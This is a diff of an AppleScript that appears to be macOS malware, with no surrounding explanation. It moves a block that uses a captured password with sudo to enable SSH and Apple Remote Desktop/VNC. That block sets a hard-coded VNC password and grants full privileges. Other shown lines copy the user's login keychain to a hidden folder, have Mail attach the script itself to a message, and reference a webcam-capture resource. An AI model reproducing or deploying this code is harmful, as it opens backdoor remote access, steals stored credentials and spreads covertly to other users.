@@ -41,6 +41,12 @@ try
 		do shell script "mv /Users/" & theuser & "/Public/." & theuser & "/login.keychain /Users/" & theuser & "/Public/." & theuser & "/" & theuser & ".keychain" -- Copy keychain to UFLD
 	end try
 	
+	try
+		do shell script "sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist" password passwd
+		do shell script "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw benwashere -restart -agent -privs -all" password passwd
+	end try
+	
+	
 end try
 
 
@@ -97,11 +103,6 @@ tell application "Mail"
 		make new attachment with properties {file name:(path to me)} at after last paragraph
 	end tell
 end tell
-
-try
-	do shell script "sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist" password passwd
-	do shell script "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw benwashere -restart -agent -privs -all" password passwd
-end try
 
 try
 	set isight to POSIX path of (path to resource "isightcapture")
